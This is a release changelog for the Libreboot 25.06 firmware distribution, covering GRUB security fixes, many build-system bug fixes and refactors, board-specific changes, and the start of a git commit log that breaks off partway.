uefitool to rev a072527, 26 Apr 2025 to fix CMake compatibility issue since CMake 4 no longer supports version 3.5, whereas the old uefitool had an earlier version as the minimum supported. This fixed a minor build error.</li><li>Merged coreboot/next with coreboot/default</li><li>Bump coreboot/next to rev c247f62749b as of 20 April 2025</li><li>Bump coreboot/default to rev c247f62749b as of 20 April 2025</li><li>Bump flashprog to revision eb2c041 (14 Nov 2024).</li></ul><p>The GRUB revision includes a number of critical CVE fixes, and regression fixes, that were also included in Libreboot 20241206 rev11. Some later fixes are also present, such as wiping LUKS keys from memory after successfully booting Linux (Linux handles LUKS itself, and starts the process again).</p><p>The NASM version was updated to version 2.16.03 on coreboot/fam15h, to prevent build errors, instead of fixing the old NASM 2.14.02. Tested on Debian Sid Experimental, with GCC15-based toolchain, and on Fedora 42.</p><p>PICO support: Reverted to the old pico serprog/sdk repositories used in Libreboot 20240612. This is temporary, because pico2 support is currently broken, so this release only has pico1 support, when dealing with Rpi Pico devices. Upstream pico-serprog works fine on pico2, so this will be fixed in and re-updated again in a future revision release. The pico2 update images were retroactively removed from the 20241206 release on rsync.</p><p>A patch from upstream was backported to the old pico-sdk version, so that it builds correctly on newer GCC15 (tested on Debian Sid with “Experimental” packages enabled).</p><ul><li>Added SPDX license headers to almost every configuration file in lbmk.</li></ul><p>These can be considered bug fixes, but these are special fixes that are of massive concern to users.</p><ul><li>This GRUB change was merged, in the aforementioned revision update: <code>dbc0eb5bd disk/cryptodisk: Wipe the passphrase from memory</code> - this wipes the LUKS key from memory, after GRUB exits, where one was created by GRUB while unlocking a given volume.</li><li>Merged  critical CVE fixes into the GNU GRUB source code, from upstream.</li><li>Stricter use of pledge and unveil in the nvmutil source code.</li><li> safer . It used to be that the tarballs were extracted and files inserted into the extracted images, but the tarballs were left unmodified; many users thought then that they should extract the tarball and flash that, which lead to bricks. And it was easy to flash uninjected images, where files (e.g.&nbsp;Intel ME) are needed, so now ROM images are padded by one byte, to prevent flashing, and the user is strongly reminded to inject files first; upon running the  commands, these images are then safe to flash.</li><li>Fix globbing issues in lbmk by double-quoting variables everywhere, and generally making sure that certain characters are escaped properly when necessary. To reduce the chance of bad commands being run by mistake or intentionally.</li><li>Removed auto-confirm on  commands, to mitigate the risk of a buggy package manager on the user’s distro possibly removing many packages. Now the user must confirm their choice, e.g.&nbsp;when a conflict occurs, instead of the package manager already deciding for the user.</li><li>ThinkPad T480 / OptiPlex 3050: Disable HyperThreading/SMT by default, for security, to reduce the attack vector of certain speculative execution-based exploits.</li></ul><p>In descending order from latest changes to earliest changes:</p><ul><li>: looser  validation; correct it on child instances, if it’s not set, or set incorrectly.</li><li>: use subshells on  functions, wrapped in an error handler so as to provide more verbose output under fault conditions. This makes it easier to debug when a download fails.</li><li>: Re-implement redundant git downloads, more reliably than before; all repositories are now cached, reliably, including submodules, even when upstream repo links differ wildly. This reduces the amount of internet bandwidth used, when handling multiple builds.</li><li>: build in tmp directory first, leaving old files behind under fault conditions, for further analysis</li><li>: re-add mac address confirmation, for user-friendliness, when running the inject commands.</li><li>: Resolve  via readlink</li><li>: Use  in , with realpath only as fallback. This makes the function more redundant, working on more systems by default.</li><li>: support any command on  (later renamed); this is a generic function, that implements a while loop for a given set of files, based on the output a command that generates those paths. This is operated on by a function, defined when calling find_exec. This unifies all use of while loops on lists of files and directories, throughout xbmk, rather than re-implementing the for/while loops each time.</li><li>: simplify kconfig scanning by using the  with a new function, . This new function checks  coreboot configs for a given target, whereas the old behaviour only resulted in the  config being checked. In practise, this causes no real behaviour changes.</li><li>: Print the rom image path being generated</li><li>: Add warning if x_ is called without args</li><li>: More verbose error info, on non-zero exits.</li><li>: Within each 4KB part, only handle 4KB, even if the block size is bigger. This means using less memory, and modification of anything past 4KB is not required.</li><li>: Support 16KB and 128KB GbE files, in addition to the usual 8KB files. The size is based on the block size of the flash you use.</li><li>Added non-root USB3 hub support to GRUB on the xHCI implementation, courtesy of a patch from Nitrokey.</li><li>GRUB: Scan LUKS inside  LVM, to support the uncommon use case where LUKS is inside LVM, instead of LVM inside LUKS. It is theoretically possible, even if ill advised.</li><li>GRUB: Scan  LVM device, where available, as a fallback at boot time when all else fails.</li><li>Release ROMs prefixed with a “DO NOT FLASH” warning and padded by one byte, where vendor files are required. The  commands remove this prefix/padding, after vendor files are inserted and checksums verified.</li><li>Better detecting of whether vendor files are needed, and confirmation to the user while running  commands.</li><li>Allow restoring the default MAC address on  commands, by using the  arguments.</li><li>Randomise the MAC address by default, where applicable, when running the  commands, because lots of users previously flashed without changing it, so lots of users had generic MAC addresses. The  argument prevents this from happening, where desired.</li><li>: More user-friendly debug messages, for the user to know what’s going on.</li><li>: Add uninstall command to the Makefile</li><li>: Add distclean command to the Makefile</li><li>: Nicer hexdump display, similar to .</li><li>Support a  argument in  Fedora commands, for re-installation of packages as desired.</li><li>Support  in the  command, when the user wants to re-install dependencies.</li><li>Put temporary  directory in the normal  directory, and clear it whenever a new parent instance of the build system is executed. This is used for the GCC/GNAT matched symlinks, for example, or the python symlink created at startup.</li><li>Pico 2 support briefly added, but was a bit buggy for now, so it’s removed in this release, and was retroactively removed in rsync for the Libreboot 20241206 release; this will be re-added in a future release.</li><li>Added GRUB-first payload setups as an option, but not enabled by default. The user can add  in the  file for a given mainboard.</li><li>Support automatically downloading Lenovo ThunderBolt firmware for the ThinkPad T480, automatically padding it for installation. This update fixes a charging bug that affected some earlier launch models.</li><li>Insert GRUB backgrounds in CBFS instead of GRUB memdisk, which makes GRUB background images easier to replace.</li></ul><p>In descending order from the latest changes to the earliest changes:</p><ul><li>ifd/hp8300usdt: set the HAP bit by default; it was previously not set, but the  config was nonetheless used, and ME Soft Temporary Disable was also used. As a result, this change is basically redundant, but otherwise technically correct (more so than the previous behaviour).</li><li>coreboot: Remove unused vboot tests (futility tests), to shrink the size of release tarballs.</li><li>coreboot/default: Remove unneeded FSP modules when downloading, because only the Kabylake version is needed at this time. This is done, using the  function via  files. This shrinks the size of release tarballs.</li><li>: add </li><li>HP 820 G2: Use fam15h cbfstool tree for refcode; this avoids the need to clutter the source code with an entire additional coreboot tree, thus reducing the size of releases.</li><li>A GRUB configuration change was made, fixing auto-scanning of LVMs when doing cryptomount.</li><li>T480/3050micro: Removed the  targets, because we only need the  targets.</li><li>Added  to Fedora 41 dependencies.</li><li>Added  to Arch dependencies, needed for the  utility.</li><li>Added  to Arch dependencies, because it’s needed for certain commands e.g.&nbsp;git commands.</li><li>GRUB: Use the codeberg mirror first, to mitigate GNU mirrors often being slow or rate limited, e.g.&nbsp;for gnulib downloads.</li><li>fedora41/dependencies: add libuuid-devel</li><li>Added  to fedora41 dependencies</li><li>flashprog: Disable  to prevent minor warnings being treated as errors.</li></ul><p>This combines both build system fixes, and changes to upstream sources (e.g. coreboot and various payloads like SeaBIOS/GRUB, utilities like flashprog, and so on).</p><p>The following bug fixes have been merged (in descending order from the latest changes to the earliest changes):</p><ul><li>: add sha512 error for . Handle errors in  and ; also check that  exists and error out if it doesn’t, when checking a given project hash. We know that the project hash file should always exist, and always be read; technically, find might not yield results, but then an empty file would be produced. the empty file edge-case scenario would already have resulted in an error exit inside , so that’s already covered.</li><li>: add error checking in , when reading the  variable; we need to error out where a read error occurs. such an error is extremely unlikely, so this fix is largely theoretical and preventative.</li><li>: more reliable clean in ; don’t do a no-op if it fails, instead fall back to the  method, and throw an error if  fails. The no-op existed because not all projects have distclean, but we always intend for them to be cleaned. This therefore prevents further unhandled error conditions, in such edge cases.</li><li>put coreboot utils in , to prevent old binaries from still being used when a code change is made.</li><li>: use printf to create version files, instead of copying the version files, because they don’t exist in some cases, so this prevents an error condition.</li><li>: error out if .git/ is a symlink; this is a preventative bug fix, to prevent future unknown bugs in such a scenario.</li><li>: Properly error out if  fails, where it previously failed to throw an error under certain fault conditions.</li><li>: Don’t auto-run make-oldconfig; it now must be applied permanently, via e.g.&nbsp; commands. Otherwise, undesirable changes can sometimes be made during build time, especially on projects that don’t use scons quite as reliably, as in the U-Boot build system.</li><li>: re-generate remotes every time, on cached Git repositories, so that configuration changes in  are automatically applied when dealing with multiple versions of a given upstream project.</li><li>: copy version files to  (release source directory), otherwise an  version number is erroneously created. This fixes a regression caused by previous optimisation to </li><li>xbmk: add fake config makefile args to , and , to prevent  (without additional arguments) from erroneously exiting with error status. otherwise, an error can occur in such conditions if a Makefile has not yet been created.</li><li>: skip running  on dry builds, otherwise running  without argument will cause an error.</li><li>: Don’t run make-clean on dry runs (), to prevent error conditions while building GRUB, if  is passed without additional argument, since the latter requiires running autoconf to get a Makefile in the GRUB build system.</li><li>: add missing check in ; we were checking the main URL on a download, but not the backup URL.</li><li>: stricter URL check in ; throw an error if a URL is empty, rather than skipping to the next. If a URL is set but fails, then falling back to the next is OK (or throw an error if the backup is set, and also failed).</li><li>: Make  always throw an error upon exiting the loop check; it was previously throwing an error if the for loop returned with zero status. Depending on the sh implementation, or changes made in the future, this could cause unpredictable buggy behaviour. Therefore, the error exit is much stricter now, and less ambiguous, to prevent future bugs, because it is imperative that execution must never continue under fault conditions. If a file or repository is successfully handled, a return (zero) occurs, otherwise the loop exits and a non-zero exit occurs.</li><li>: fix up , or specifically fix a bad  loop, because shorthand conditionals are used and the way they were used can be buggy on some sh implementations, so they are terminated more explicitly.</li><li>xbmk: stricter handling of files on while loops, to prevent instances where execution continues under fault conditions. This prevents other, less predictable bugs in the future.</li><li>: Hardcode  for integrity; this is a bug fix, because there’s too much that can be wrong with this being configurable, so now it is hardcoded at runtime. It was never intended to be configurable anyway.</li><li>: check/validate version/versiondate once read, in child instances of xbmk, to further verify that they were previously set, and set correctly. This is theoretically a preventative bug fix.</li><li>: force an error condition if the xbmk version was not read. This prevents further erroneous state within xbmk.</li><li>: check the  file BEFORE , to prevent erroneous initialisation while another xbmk parent instance is running.</li><li>: return from xbmk child instances in  instead. This is easier than the previous check, preventing the initialisation of a git repo and/or recreation of xbmktmp and xbmklocal by erroneoues parent executions of xbmk while another parent is running - the latter of which could have caused a massively unpredictable build failure, so this is also a preemptive bug fix, fixing and preventing all kinds of weird unknown bugs.</li><li>: Remove  if it’s bad; this complements a bug fix, in the bug fix section above, that caches the extracted files and hashes them. On a subsequent run where the given file is needed, it is  if the final file exists. This mitigates the possibility that corruption may have occured, under unhandled fault conditions. Therefore, this is a preventative bug fix.</li><li>: don’t move  to  inside release archives, because otherwise  will fail, inside release archives.</li><li>: Properly verify SHA512SUM on extraction. This is performed on the actual extracted files, alongside the existing check on downloaded files. This mitigates against future fault conditions in the extraction process, thus fixing a major design flaw. <em>This change also caches those files, thus speeding up extractions when they’re done multiple times.</em></li><li> submodules: Don’t delete files recursively. Use  instead of , on files.</li><li>: Only create destination repo on success; don’t leave a broken cache laying around, which would otherwise break the build system under certain conditions.</li><li>: removed an unnecessary  variable</li><li>: delete tmp/cache from release tarballs</li><li>: Remove confusing path on tar creation; that is, don’t print said path, because temporary paths are printed during this, when creating tarballs. In this file, the correct path is printed at the end of the process, when handling an images tarball.</li><li>: only create elfdir in , to prevent empty directories being created where a project provides , but where no actual configs are being built on a given target name.</li><li>: operate on refcode in tmp area first, to prevent bad files from being saved to the final destination under fault conditions. This pertains to the change made at build time that enables GbE devices from the refcode.</li><li>: use subshell to speed up  (this is a bug fix, because slowness is a bug)</li><li>: add missing error handli for  (when doing releases)</li><li>: hard fail if git am fails (regression fix)</li><li>: Hard fail if reset fails; allowing re-try when cloning fails, but the reset-fail scenario didn’t cause any exit at all. This is fixed now.</li><li>: Only check  if it exists</li><li>: fix trying to boot all logical volumes after unlocking an encrypted volume; this makes booting LVMs more reliable, on encrypted boot setups.</li><li>: also allow  or , not just  and , because some people use uppercase here. This is considered a bug fix, but could just as easily have been in the features section.</li><li>: check  is a directory instead of a file.</li><li>: run , to prevent a future situation where the version is not set correctly. In general, the version should always be set as early as poessible when running xbmk.</li><li>: clean up tmp me file before extract; this is a preventative fix, to ensure that cross-flashing does not occur.</li><li>: re-add missing break in fe/fx_, that caused improper exits (or non exits) in some cases.</li><li>: use , not ; this is a less strict test, to prevent certain errors under specific edge-case conditions.</li><li>: Safer ; don’t insert special files like GRUB keymaps AFTER copying the system ROM to the final destination; do it BEFORE, instead, to ensure that bad images aren’t left in place under fault conditions.</li><li>: specifically check keymaps in ; it previously checked whether a setup is  seauboot, which was valid, but future conditionals would break this check. the code has been changed in advance, to prevent bugs in a future revision of xbmk.</li><li>: Fix bad error handling for ; I accidentally mixed and/or in a shorthand conditional statement, which leads to buggy behaviour in various implementations of sh.</li><li>GRUB: Mark E820 reserved on coreboot memory, to fix cbmem when running with strict  access; otherwise, restrictions on access to memory below 1MB will cause an error when trying to access the cbmem console.</li><li>: set  in  in case they were set  in other parts of xbmk.</li><li>: Silence the output of git config –global</li><li>: Run git name/email check before init; otherwise, it returns if init is already done, which could lead to an error later when building coreboot.</li><li>: stricter  check in </li><li>: simplify err-not-set handling</li><li> err: add missing redirect to stderr</li><li>xbmk: MUCH safer  function; make it an actual function, instead of a variable. Initially, this function was made to then check a variable, that refers to a function, and a fallback was provided for non-zero exit in case the pointed function didn’t, but it was later made to be just a simple function that exits with a message. Code equals bugs, so fewer lines of code will yield fewer bugs.</li><li>: Make x_ err if first arg is empty; this is a preventative bug fix, to make the build system still exit under such conditions, but it would result in an empty error message.</li><li>: Make err_ always exit no matter what; this is a preventative bug fix, just making the exit stricter in all cases.</li><li>: re-make gnupath/ after handling crossgcc, rather than deleting files within. This makes the creation of it more reliable.</li><li>: re-make gnupath/ for each cross compiler, to ensure that no stagnant build artifacts are re-used</li><li>: Stricter TBFW handling; don’t copy it until it has been properly padded to the correct size.</li><li>:  tmpdirs on parent instance, to ensure that they are not cluttered with old files that might cause weird bugs in the future; this is a preventative bug fix.</li><li>: Always create xbmklocal, to prevent errors in the case when it isn’t created automatically in certain child instances, like when running a  copy of the build system, during release builds.</li><li>: Fix bad touch command</li><li>: always re-build nvmutil, so that changes to it are automatically re-applied when running the build system again. (and only build it once, for a given instance of xbmk)</li><li>: use , not , for random characters, while still supporting  for backwards compatibility. This is because ZSH errors out when providing the old characters, in some setups. Use of  is more reliable, across several implementations of sh, e.g.&nbsp; would be a full random MAC address.</li><li> find_ex: explicitly create the tmp file, to prevent errors, which were nonetheless unlikely to begin with.</li><li>: Explicitly create the xbmktmp directory (make sure to do this when creating this which is a temporary directory).</li><li>: add fe_ which is fx_ but err on find</li><li>xbmk: unified execution on  commands. Handle it with a new special function that is common across the build system.</li><li>: Download vendorfiles before building release, to mitigate intermittent internet connectivity during release builds, otherwise a release build could fail. This way, all downloads are done simultaneously, since downloads are the fastest part, even on a crap internet connection.</li><li>Revert AHCI reset patch for SeaBIOS, which caused AHCI not to work in SeaBIOS on the 25.04 release; the latter was also revised, to fix this. SeaBIOS has since added a new release, which includes a fix that delays AHCI reset, to mitigate in cases where the controller isn’t ready sooner. However, this release simply reverts the AHCI reset patch for now. The AHCI reset plus delay will be present in Libreboot’s next release, after 25.06.</li><li>lenovo/t420: Add missing text-mode configuration</li><li>coreboot (all trees): Added patch fixing GMP build errors on modern GCC15 hostcc.</li><li>coreboot (all trees): Fixed building of crossgcc with newer GCC15. Patches courtesy of Alper Nebi Yasak.</li><li>coreboot (all trees): Added a patch to fix building coreboot utils with newer GCC15.</li><li>dependencies/debian: Fixed the libusb package name for newer Debian releases, courtesy of Alper Nebi Yasak.</li><li>SeaBIOS: Fixed  function pointers in the  patch, courtesy of Alper Nebi Yasak. Fix build errors on GCC 15.</li><li>: Force use of System Python e.g.&nbsp;, when a python venv is detected. This prevents the build system from hanging.</li><li>coreboot : Fixed the  path.</li><li>Alper Nebi Yasak fixed the Python 2/3 detection in some edge cases when the  command is python2.</li><li> (later ): Do root check , right after the dependencies check, whereas it previously did the python check before checking for root user.</li><li>lbmk: Don’t use TMPDIR directly, use another variable containing its value, and make sure it doesn’t get changed wrongly. This reduces the possibility of accidentally leaving old tmp files laying around.</li><li>:  commands now return an exit with error, if a fault occurs, whereas it didn’t before, due to piped output. This is done using the  wrapper on tar commands, to provide error exits.</li><li>: function  now returns an error, if the sha512sum command fails. It previously didn’t, due to piped outputs. It’s now mitigated by using  on piped commands, for error exits.</li><li>Forking of lbmk parent instance to child instance isno longer handled by variables. It’s been simplified, to only be based on whether TMPDIR is set, and it’s generally more robust now in this release. The old code sometimes broke under certain edge cases.</li><li> (later renaming to ): General code cleanup, about 100 sloc removed without reducing features.</li><li>lbmk: Initialise  to a standard string if not set, on the parent instance of lbmk.</li><li>lbmk: Use  instead of the  variable, resetting the latter safely as lbmk runs. This prevents lbmk from changing directory to an erroneous system path, if  wasn’t properly set for some reason. This is a preventative bug fix, because no actual issue ever occured in practise.</li><li>Much safer Python version check at lbmk startup, using data structures that are provided universally by all Python implementations, instead of relying on the output of .</li><li>Fixed T480 backlight controls, courtesy of a patch from Mate Kukri.</li><li>Set up Python in  when lbmk starts, to ensure that it is always version 3. This is checked at startup.</li><li>: Prevent double-nuke, where a given tarball already had vendor files removed prior to release.</li><li>: Allow setting a MAC address even if vendor files aren’t needed.</li><li>: Download utils even if  is not set, in case the user is also setting a MAC address.</li><li>: Honour the  variable, if set by the user, otherwise it is set to  by default.</li><li>: Don’t do  when running .</li><li>: Proper DESTDIR/PREFIX handling, whereas it was not handled properly at all before.</li><li>: Only set CC/CFLAGS if unset, and use sensible defaults.</li><li>Fixed various shellcheck errors in lbmk.</li><li>HP EliteBook 820 G2: Fixed vendor file insertion and set . The insertion of Intel MRC and refcode previously didn’t pass checksum validation.</li><li>ThinkPad T480 / OptiPlex 3050: Force power-off state upon recovery from power loss, otherwise the system always turns on as soon as a charger is plugged in. This is configured by hardcoding, due to a current lack of any option table on the T480.</li><li>Debian dependencies: replace liblz4-tool with lz4 and liblz4-dev. The latter is also available in Debian Trixie and Sid, at this time, in addition to Debian Bookworm, so it works on all of them.</li><li>U-Boot (x86): Fixed a bug since Swig 4.3.0 changed the syntax for its language-specific AppendOut functions. A patch from upstream was backported, and the patch is also compatible with older versions of Swig.</li><li>In lbmk scripts, use  instead of , to find the locations of certain binaries. This is a bug fix, since  is non-standard and so could break on some setups.</li><li>Crossgcc: when building it for coreboot, fix mismatching GCC/GNAT versions so that they match, if multiple versions are present. This was done because Debain Trixie initially had GCC 14 and GNAT 13, whereas we need GNAT to build the Intel video init code on many mainboards.</li><li>T480/T480: Disable TPM2 to mitigate a hang in SeaBIOS due to buggy drivers.</li><li>: Fix the  package, renamed it to , which works on bookworm  newer, but the former did not.</li><li>: don’t initialise the  variable globally, reset it per target instead, to prevent some repositories from being wrongly re-cloned.</li><li>Thinkpad T480 / Dell OptiPlex 3050: Handle FSP insertion post-release, rather than providing FSP images directly in release images. It is now handled by the  command, copying the reference image from coreboot and splitting it upp and rebasing it, to mitigate certain technicalities of Intel’s FSP license, which otherwise permits free redistribution.</li><li>Safer, more reliable exit when handling vendor files, because in some cases lbmk was leaving the  file in place (erroneously).</li><li>Safer exit when running the  commands, so that lbmk is more likely to exit, because it was theoretically possible that it might not under certain edge cases.</li><li>Disable nvme hotplug on Dell OptiPlex 3050 Micro, to prevent replugging in Linux, which would otherwise lead to possible data corruption.</li><li>T480: Fix coreboot SPD size to 512 instead of 256 (it was already auto-corrected to 512 at build time, but the original configs were 256 which is wrong).</li><li>Add tarballs and gpg signatures to </li></ul><p>Another bug focus in this release was to clean up the logic of Libreboot’s build system, and fix several bugs, especially those relating to error handling.</p><p>A lot of cleanup was done on the init functions used by the build system, to initialise common variables, such as environmental variables, and temporary files and/or directories; such logic was moved to a new script called .</p><p>In descending order from the latest changes to the earliest changes:</p><ul><li>: simplify </li><li>: simplify </li><li>: simplify </li><li>: simplify </li><li>: tidy up </li><li>: simplify </li><li>general cleanup in  and </li><li>xbmk: rename / variables (shorten them)</li><li>: consolidate printf statements</li><li>: remove redundant printf in </li><li>: remove superfluous command in </li><li>: simplify </li><li>: simplify </li><li>: rename , which actually handles general init tasks, including the processing of vendor files where appropriate.</li><li>: simplify ccache handling for coreboot; make-oldconfig wasn’t needed at all, when cooking configs to enable ccache, so the  function became much smaller and was then merged with </li><li>: simplify u-boot payload handling, by using a single variable name that defines the type of U-Boot tree. This allows several other U-Boot-related checks to be greatly simplified, as they were.</li><li>: add a colon at the end of a  loop</li><li>: make  easier to understand, by not using shorthand conditional statements in the for loop handling a repository or file download.</li><li>: merge  with </li><li>: set pyver from  instead of the main function.</li><li>: merge  with </li><li>: only update version files on parent, to speed up xbmk</li><li>: simplify unknown version creation, where none was created and no Git metadata exists.</li><li>: only set xbmk version on parent instance; we only need to read what was set, on child instances. In other words, apply the principle of least privelege.</li><li>: initialise variables AFTER path, to avoid unnecessary work inside child instances of xbmk.</li><li>: merge  with </li><li>: Set python version only on parent instances of xbmk, to speed up operation of the xbmk build system.</li><li>:  to </li><li>: move  creation to </li><li>: move PATH init to </li><li>: shorten the  variable name</li><li>: simplify </li><li>: simplify </li><li>: use  on find command for , so as to remove the need for a more complicated while loop inside said function.</li><li>: move  to  and only run it on releases; don’t do it on normal xbmk Git. It’s only needed in the former context, because that has to do with distribution by the project, and this makes development easier. Therefore, files are only purged within the release archives, but not during development.</li><li>: simplify </li><li>: merge  with </li><li>: simplify </li><li>: simplify  by using  for the file loop</li><li>: simplify </li><li>: simplify  config check</li><li>: simplify  by using  for everything, instead of implementing redundant logic in the build system.</li><li>: reduce indendation in ; simplify the for loop by replacing it with a call to  instead.</li><li>: simplify </li><li>: clean up the  after release</li><li>: removed an unnecessary  command</li><li>: split up  into smaller functions</li><li>: remove the unnecessary  function</li><li>: move  to </li><li>: move  to </li><li>: split up  into smaller functions</li><li>: move  to </li><li>: remove the  variable</li><li>: define  here instead</li><li>: remove </li><li>: simplify </li><li>: simplify </li><li>: split up  into smaller functions</li><li>: only compile nvmutil if needed</li><li>: simplified serprog check</li><li>: tidy up variables</li><li>: split up  into smaller functions</li><li>: further cleanup for , such that all vendor-download functions are only defined in ; this means that the Canoeboot version of the file can remain in much closer sync, with fewer differences.</li><li>: simplified srcdir check on make-clean</li><li>: split download functions to a new file, </li><li>: split up the inject functions into smaller functions for each specific task.</li><li>xbmk: use  instead of , where appropriate, because it handles globbing perfectly these days, and  is cleaner in most cases.</li><li>: fix outdated info in a comment</li><li>: use direct comparison for metmp, to speed up checking so many files.</li><li>: remove unnecessary line break</li><li>: re-split tree logic to new file, </li><li>: move release functions to </li><li>: use  for fail variables</li><li>: remove useless export; variables that are y/n can just be reset to  if not set to , for simplicity.</li><li>: export  in  instead of .</li><li>: simplify </li><li>: simplified MAC address handling</li><li>: Simplify </li><li>: Remove useless command in </li><li>: rename  and  functions (make the names shorter).</li><li>: Simplified  and removed ; fe didn’t prefix  to a given command, but fx did. Now, it is prefix manually, for greater control, on commands that need stricter error handling, while it can be avoided on commands where strict error handling is unfeasible.</li><li>: Create serprog tarballs here instead;  was simplified to use mkhelp when building actual images.</li><li>build serprog images using , to tidy up xbmk</li><li>: build serprog images with , rather than implementing a specific for loop.</li><li>: insanely optimise the me bruteforce, by operating on files recursively via the  function, instead of manually implementing a recursive file search, when bruteforce-extracting  images.</li><li>: Simplify git am handling by using the new  or  function, instead of making a specific while loop.</li><li>: remove an unused function</li><li>: New function  to execute path files; this is used instead of for loops all around xbmk, to simplify operations where the output of a file search is used as argument to a function.</li><li>: Further simplified FSP extraction</li><li>: Write sort errors to </li><li>: Remove warning of empty args; it’s really not required, since it’s obvious anyway in the resulting final error message.</li><li>xbmk: Replace  with much simpler implementation, for reliability and bug prevention.</li><li>: simplify </li><li>: simplify </li><li>: move  to </li><li>: simplify <code>extract_intel_me_bruteforce()</code></li><li>: Remove unnecessary check</li><li>: reduce indentation</li><li>: Move FSP extraction only to , since that’s the only place where it’s needed.</li><li>: tidy up intel me handling</li><li>: tidy up the deguard command</li><li>: single-quote xbmklock in </li><li>: define lock file in a variable instead; this makes it more flexible, because the path can be checked and then re-used nicely.</li><li>: tidy up ; make the command style more consistent</li><li>: rename errx to xmsg</li><li>: tidy up TBFW handling</li><li>: remove useless comment block</li><li>: tidy up the python version check</li><li>: move non-init functions to </li><li>: simplify dependencies handling</li><li>: tidy up </li><li>: tidy up xgccargs handling</li><li>: generally removed dead code</li><li>: tidy up pathdir creation</li><li>: tidy up </li><li>: reduce indentation in </li><li>: Allow use of x_ on prefix functions</li><li>: tidy up  sha512sum check</li><li>: simplify </li><li>: general code cleanup</li><li>: simplify </li><li>: simplified fsp extraction</li><li>: Remove redundant code in copy_tbfw</li><li>xbmk: Unified local ./tmp handling</li><li>: redirect find errors to  to prevent clutter on the user’s terminal</li><li>: unified handling of ./tmp</li><li>: include rom.sh directly</li><li>: support multiple arguments in remkdir()</li><li>: simplify remkdir()</li><li>: move setvars/err_ to lib.sh</li><li>: Generally modularised it, moving separate tasks into separate functions, rathher than having it be one big monolith.</li><li> was renamed to , so that future changes can be in better sync between lbmk and cbmk on this file, because the cbmk version has the MAC address changer (but no vendorfile handling). In the future, this will be split so that  exists again, containing only the vendorfile handling, and  will only handle MAC addresses.</li><li>: Several variables were moved out of this file and elsewwhere in lbmk.</li><li>Moved the  function to  instead of </li><li>Moved the  function from  to .</li><li>: Use a more top-down function order, more clear, and it was split into an extra file  that does the most basic lbmk initialisation at startup, whereas what remains in  really are generic library functions used throughout lbmk.</li><li>: Removed unused crossgcc linking feature, because we don’t use it anymore (coreboot trees have their own crossgcc and never link to another these days). Libreboot used to have many more coreboot trees, some of which re-used crossgcc from another tree. Similarly, the accompanying variable  is no longer handled. The  variable is still handled, because projects like U-Boot use that to configure crossgcc.</li><li>include/vendor.sh: Removed unnecessary check against the ROM image size. Generally simplified the processing of release images.</li><li>include/git.sh`: Removed many redundant functions, merging several of them.</li><li>: Fixed a bad print, making proper use of a string inside a printf statement.</li><li>Simplified many file checks in lbmk, by using the  function.</li><li>Removed a bunch of useless  commands in general, throughout lbmk, making the code much cleaner.</li><li>lbmk: the  function is now used much more aggressively, for error handling, simplifying error handling in lbmk overall.</li><li> main script: Merged the  script with it, so now it’s all one script. The  script is now the only executable script in lbmk.</li><li> (main script): The  command is removed (legacy / obsolete).</li><li>The version/versiondate files are now dotfiles, to hide during operation.</li><li>: Hardcoded projectname/projectsite variables, instead of storing them in a file.</li><li> script: Unified handling of flags (same string used in error output), to ensure that error(usage) messages always match.</li><li> script (later merged into ): Removed a lot of old bloat.</li><li>: Make the checksum word position a define. Generally cleaned up a lot of code to make it clearer for the reader. Added more verbose messages to the user, confirming things such as how much was read or written on the user’s file system. Various miscallaneous bug fixes (edge cases that were unlikely to ever be triggered).</li><li>: More efficient use of memory when handling files.</li><li>: Much cleaner handling of user input.</li><li>`util/nvmutil: More granular MAC address parsing errors, easy for debugging.</li><li>: Make the Gbe Checksum a define, for readibility.</li><li>: Obey the 79-character-per-line limit, as per lbmk coding style.</li><li>: Tidied up several pledge calls</li><li>Removed use of several unnecessary subshells and  statements in lbmk.</li><li>: Later, the GCC/GNAT matching feature was rewritten to work both ways, where an older GCC was matched to GNAT and vice versa, whereas it previously only went one way.  and  are manipulated in  to ensure that the user has a consistent version of both.</li><li> later merged into the  script (which later merged into the main  script). This  is what contained the first implementation of the GNAT/GCC version matching feature.</li><li>: Remove unnecessary shebang, and the same on other  scripts. NOTE:  was later merged into , which then became split into  in later changes (see above).</li><li>Removed legacy build system commands e.g.&nbsp; and ; now only the newer  commands are supported. This and the change below was briefly reverted, for the 20241206 revisions, but then re-introduced.</li><li>Removed the deprecated  command; now only  commands are used. The  commands are used, for downloading vendor files.</li><li>Removed unused patch that was for the original deguard implementation, prior to Mate Kukri’s re-write of it.</li></ul><p>This log shows all changes in today’s release, from 30 June 2025, ever since the Libreboot 20241206 release of 6 December 2025:</p><pre><code>* c46a71138c7 Libreboot 25.06 release \n* b1ef562b767 tree.sh: add sha512 error for check_project_hashes \n* 04bee3834d0 tree.sh: add error check in check_project_hashes() \n* 677dfc4d103 tree.sh: more reliable clean in run_make_command \n* 267d4c90341 inject.sh: add missing semicolons \n* 974bdbb3815 vendor.sh: fix bad cbfstool path \n* dc6996252a0 put coreboot utils in elf/coreboot/TREE \n* b77154640de release.sh: use printf to create version files \n* dee6997d0cc lib.sh: simplify setvars() \n* 79ded40f3d0 lib.sh: simplify chkvars() \n* 5036a0bc501 mk: simplify main() \n* 41308ee9244 get.sh: simplify fetch_project() \n* b5867be214d get.sh: simplify try_copy() \n* 495098d6a71 get.sh: tidy up bad_checksum() \n* 671e3aa27b4 get.sh: simplify fetch_targets() \n* 09b6e91803d general cleanup in get.sh and vendor.sh \n* 18dacd4c22b xbmk: rename xbmklocal/xbmktmp variables \n* e981132c829 get.sh: consolidate printf statements \n* afc36754b13 get.sh: remove redundant printf in fetch_project \n* ffe387ac6b9 get.sh: remove superfluous command in try_git() \n* ba7c49c090b vendor.sh: simplify fetch() \n* 30bc3732c39 init.sh: error out if .git/ is a symlink \n* 2493203ee53 get.sh: Properly error out if tmpclone fails \n* ad333ae2481 tree.sh: Don't auto-run make-oldconfig \n* 97ce531c341 rom.sh: simplify mkcoreboottar() \n* a47e9811723 rom.sh: rename mkvendorfiles \n* d2e148fdd9d rom.sh: simplify ccache handling for coreboot \n* 8c3f10ba402 rom.sh: simplify u-boot payload handling \n* 3e28873532b ifd/hp8300usdt: set the HAP bit by default \n* 452aeb6001a coreboot: Remove unused vboot tests \n* 64cc91bca33 coreboot/default: Remove unneeded FSP modules \n* 0216a3104a5 get.sh: Always update git remotes \n* 419733d3073 get.sh: re-generate remotes every time \n* 231b320e63b release.sh: copy version files to rsrc \n* fc0720184d9 xbmk: add fake config makefile args to flashprog \n* f9266601b8c vendor.sh: add colon at the end of a for loop \n* 8e0c6059d15 rom.sh: skip copyps1bios on dry builds \n* a3250d14474 tree.sh: Don't run make-clean 